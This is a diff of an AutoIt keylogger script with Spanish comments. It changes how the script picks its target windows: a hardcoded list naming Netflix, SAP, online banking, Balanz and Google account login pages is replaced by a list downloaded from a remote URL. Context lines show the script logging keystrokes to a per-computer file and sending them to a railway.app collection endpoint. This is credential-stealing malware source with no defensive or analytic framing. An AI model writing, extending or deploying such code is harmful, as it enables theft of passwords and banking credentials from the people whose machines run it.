@@ -2,7 +2,7 @@
 #include <WindowsConstants.au3>
 #include <InetConstants.au3>
 #include <MsgBoxConstants.au3>
-
+#include <Array.au3>
 
 Opt('MustDeclareVars', 1)
 ; Asociar una función a la acción "Salir"
@@ -24,6 +24,33 @@ Global $url = "https://kl.up.railway.app/?kl="
 Global $lastActiveWindow = "", $lastActiveTime = 0
 Global $file_name = @computername & "_log.txt"
 Global $last_send = 0
+
+; Realizar la solicitud HTTP GET
+Local $sURL = "blob:https://github.com/815309cb-d309-42f5-ba0a-dbf0407f0b45"
+
+Local $sContent = InetRead($sURL)
+
+; Verificar si la solicitud fue exitosa
+If @error = 0 Then
+    ConsoleWrite("Contenido descargado:" & @CRLF & $sContent & @CRLF) ; Depuración
+    
+    ; Convertir el contenido a una matriz de títulos
+    Local $aLines = StringSplit($sContent, @CRLF, 1)
+    Global $aTitles[$aLines[0]]
+
+    For $i = 1 To $aLines[0]
+        $aTitles[$i - 1] = $aLines[$i]
+    Next
+
+    ; Imprimir la matriz de títulos
+    _ArrayDisplay($aTitles, "Títulos")
+Else
+    MsgBox(16, "Error", "No se pudo descargar la matriz.")
+EndIf
+
+
+
+
 
 While 1
 	_Main()
@@ -79,28 +106,6 @@ EndFunc
 
 
 
-#include <Array.au3>
-func Get_titles()
-; Realizar la solicitud HTTP GET
-Local $sURL = "http://www.martiz.com/listado"
-Local $sContent = InetRead($sURL)
-
-; Verificar si la solicitud fue exitosa
-If @error = 0 Then
-    ; Convertir el contenido a una matriz de títulos
-    Local $aLines = StringSplit($sContent, @CRLF, 1)
-    Local $aTitles[$aLines[0]]
-    For $i = 1 To $aLines[0]
-        $aTitles[$i - 1] = $aLines[$i]
-    Next
-
-    ; Imprimir la matriz de títulos
-    _ArrayDisplay($aTitles, "Títulos")
-Else
-    MsgBox(16, "Error", "No se pudo descargar la matriz.")
-EndIf
-
-
 
 
 Func send_file($forced_action)
@@ -121,7 +126,7 @@ EndFunc
 Func EvaluateKey($keycode)
     $title = WinGetTitle("")
     $buffer = key($keycode)
-	Local $titles[9] = ["Netflix", "BRP(1)/000 SAP", "SAP", "Balanz", "Online Banking", "Desprot", "prot", "Contrase","Acceso: Cuentas de Google"]
+	 
 	Local $bFound = False
 
 	For $i = 0 To UBound($titles) - 1
